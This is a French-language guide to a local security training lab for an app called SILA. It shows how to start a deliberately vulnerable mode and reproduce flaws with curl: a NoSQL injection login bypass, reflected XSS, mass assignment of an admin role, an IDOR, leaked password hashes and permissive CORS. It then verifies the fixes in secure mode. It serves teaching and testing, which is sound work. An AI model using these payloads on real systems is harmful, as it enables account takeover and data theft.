# Guide du laboratoire de sécurité

**Règles** : local uniquement, données fictives, jamais sur Internet. Le mode vulnérable refuse `SILA_ENV=production`.

## 1. Démarrer
```bash
# Terminal 1
bash scripts/start-backend.sh vulnerable
```
Ouvrir http://localhost:8000/docs : les routes `SECURITY-LAB (vulnerable)` apparaissent. En mode sécurisé, elles n'existent pas.

## 2. Reproductions contrôlées (Git Bash, `curl`)
```bash
# VULN-03 Injection NoSQL : se connecter comme admin sans mot de passe
curl -s -X POST localhost:8000/api/lab/login -H "Content-Type: application/json" \
  -d '{"email":"admin@sila.test","password":{"$ne":""}}'
# attendu : 200 avec "role":"ADMIN"

# VULN-05 XSS réfléchi
curl -s "localhost:8000/api/lab/search?q=<script>alert(1)</script>"
# attendu : le <script> est renvoyé tel quel dans le HTML

# VULN-09 Mass assignment
curl -s -X POST localhost:8000/api/lab/register -H "Content-Type: application/json" \
  -d '{"email":"evil@x.com","password":"1","name":"Evil","role":"ADMIN"}'
# attendu : "role":"ADMIN"

# VULN-01 / 14 Contrôle d'accès + fuite de hashes
curl -s localhost:8000/api/lab/admin/users

# VULN-02 IDOR : récupérer un id de commande depuis Compass (collection orders)
curl -s localhost:8000/api/lab/orders/<ID_COMMANDE>      # sans token → 200

# VULN-15 CORS
curl -si localhost:8000/api/health -H "Origin: http://evil.example" | grep -i access-control
# attendu : access-control-allow-origin: *
```
## 3. Corriger et vérifier
Arrêtez le backend, relancez en mode sécurisé :
```bash
bash scripts/start-backend.sh secure
curl -i localhost:8000/api/lab/config    # attendu : 404
```
Rejouez les mêmes attaques : elles échouent (422/403/404/400).

## 4. Tests automatiques
```bash
bash scripts/test.sh
```
- `test_secure_*` : prouvent que le mode sécurisé résiste.
- `test_lab_*` : prouvent que le labo est bien exploitable (utile pour vos démonstrations).

## 5. Catalogue complet
`SECURITY_LAB/documentation/VULNERABILITY_CATALOG.md`
